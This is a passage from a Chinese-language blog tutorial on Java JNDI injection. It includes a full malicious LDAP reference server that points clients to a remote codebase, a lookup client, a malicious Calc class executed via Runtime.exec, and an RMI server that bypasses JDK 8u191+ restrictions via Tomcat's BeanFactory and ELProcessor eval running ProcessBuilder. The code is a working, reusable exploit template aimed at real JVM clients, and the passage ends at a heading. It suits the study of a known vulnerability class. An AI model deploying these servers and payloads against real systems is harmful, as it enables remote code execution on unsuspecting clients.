+<p><code>getObjectFactoryFromReference()</code> 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 <code>loadClass()</code> 方法。</p>
+<p>继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 ———— URLClassLoader</p>
+<p>最后在 newInstance() 这一步执行代码。</p>
+<h3 id="2-1-3-总结"><a href="#2-1-3-总结" class="headerlink" title="2.1.3 总结"></a>2.1.3 总结</h3><p>总结一下还是比较简单的，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是因为 RMI 的问题。</p>
+<p>然后攻击点的话，就是因为客户端进行了 <code>lookup()</code> 方法的调用。因此这也是服务器攻击客户端的方法。</p>
+<p>这个漏洞在 jdk8u121 当中被修复，也就是 <code>lookup()</code> 方法只可以对本地进行 <code>lookup()</code> 方法的调用。</p>
+<h2 id="2-2-Jndi结合ldap"><a href="#2-2-Jndi结合ldap" class="headerlink" title="2.2 Jndi结合ldap"></a>2.2 Jndi结合ldap</h2><h3 id="2-2-1-ldap介绍"><a href="#2-2-1-ldap介绍" class="headerlink" title="2.2.1 ldap介绍"></a>2.2.1 ldap介绍</h3><p>ldap 是一种协议，并不是 Java 独有的</p>
+<p>LDAP 既是一类服务，也是一种协议，定义在 <a target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p>
+<p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p>
+<p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p>
+<h3 id="2-2-2-ldap的JNDI漏洞"><a href="#2-2-2-ldap的JNDI漏洞" class="headerlink" title="2.2.2 ldap的JNDI漏洞"></a>2.2.2 ldap的JNDI漏洞</h3><p>先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 <code>unboundid-ldapsdk</code> 的依赖。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>编写ldap服务端的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.deploy.cache.InMemoryLocalApplicationProperties;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Calc&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()<br>            ));<br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL url)</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = url;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">baseDN</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(baseDN);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, baseDN, e);<br>            &#125; <span class="hljs-keyword">catch</span> (LDAPException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>            &#125; <span class="hljs-keyword">catch</span> (MalformedURLException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException, MalformedURLException, LDAPException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后再来编写客户端client的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.LdapClient.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/12 13:10</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/Calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>然后再来编辑恶意类Calc.java并编译，这里有个需要注意的问题，这个恶意类请不要带上package的标签，eg：<code>package com.***;</code>，不然可能没法成功弹出计算器，会报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.Calc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/12 13:14</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译完成了恶意类后得到<code>Calc.class</code>，然后再<code>Calc.class</code>的目录下用python起一个http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 8000<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071834250.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>这个攻击就还是我们之前说的 Reference</li>
+</ul>
+<p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP+Reference远程工厂类的加载增加了限制。</p>
+<p>所以，当JDK版本介于8u191、7u201、6u211与8u121、7u131、6u141之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p>
+<p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p>
+<h2 id="2-3-jndi结合CORBA"><a href="#2-3-jndi结合CORBA" class="headerlink" title="2.3 jndi结合CORBA"></a>2.3 jndi结合CORBA</h2><p>一个简单的流程是：<code>resolve_str</code> 最终会调用到 <code>StubFactoryFactoryStaticImpl.createStubFactory</code> 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 <code>RMIClassLoader</code>，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。</p>
+<h1 id="三、绕过高版本jdk的攻击"><a href="#三、绕过高版本jdk的攻击" class="headerlink" title="三、绕过高版本jdk的攻击"></a>三、绕过高版本jdk的攻击</h1><h2 id="3-1-jdk8u121"><a href="#3-1-jdk8u121" class="headerlink" title="3.1 jdk8u121&lt;jdk_version&lt;jdk8u191"></a>3.1 jdk8u121&lt;jdk_version&lt;jdk8u191</h2><p>介于 121 和 191 版本之间的 jdk8 可以通过一些手段利用 JNDI 注入漏洞；可以通过 ldap+reference  进行利用，如上所述；</p>
+<p>这个漏洞出现的原因在于 JNDI 本身，可以先来看看在 jdk8u191 之后的版本进行了哪些 patch；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 旧版本的jdk（jdk-version &lt; jdk8u191）</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase) <br><span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> getContextClassLoader();<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);<br>    <span class="hljs-keyword">return</span> loadClass(className, cl);<br>&#125;<br><br><span class="hljs-comment">// 新版本的jdk（jdk-version &gt;= jdk8u191）</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)<br><span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase))&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> getContextClassLoader();<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);<br>        <span class="hljs-keyword">return</span> loadClass(className, c1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>自从 jdk8u191 更新以后，在使用<code>URLClassLoader</code>远程类加载器之前增加了一个 if 判断，根据 <code>trustURLCodebase的值是否为true</code> 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 <code>trustURLCodebase 的值是否为 true</code> 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。</p>
+<h2 id="3-2-jdk-version-jdk8u191"><a href="#3-2-jdk-version-jdk8u191" class="headerlink" title="3.2 jdk_version&gt;&#x3D;jdk8u191"></a>3.2 jdk_version&gt;&#x3D;jdk8u191</h2><h3 id="利用本地恶意-Class-作为-Reference-Factory"><a href="#利用本地恶意-Class-作为-Reference-Factory" class="headerlink" title="利用本地恶意 Class 作为 Reference Factory"></a>利用本地恶意 Class 作为 Reference Factory</h3><p>根据我们之前说的，在 jdk8u191 后增加了一个是否本地类的判断，那么……只要恶意类在服务端不就行了吗，如此简单；</p>
+<p>简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现该接口的 getObjectInstance() 方法。</p>
+<p>大佬找到的是这个 <code>org.apache.naming.factory.BeanFactory</code> 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 <code>getObjectInstance()</code> 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。</p>
+<ul>
+<li>恶意客户端（以下 2 选 1）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJava.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:38</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJava</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry( <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +<br>                <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +<br>                <span class="hljs-string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil command: calc&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJavaServerRebind.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:42</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaServerRebind</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span> );<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>jndi 客户端</li>
+</ul>
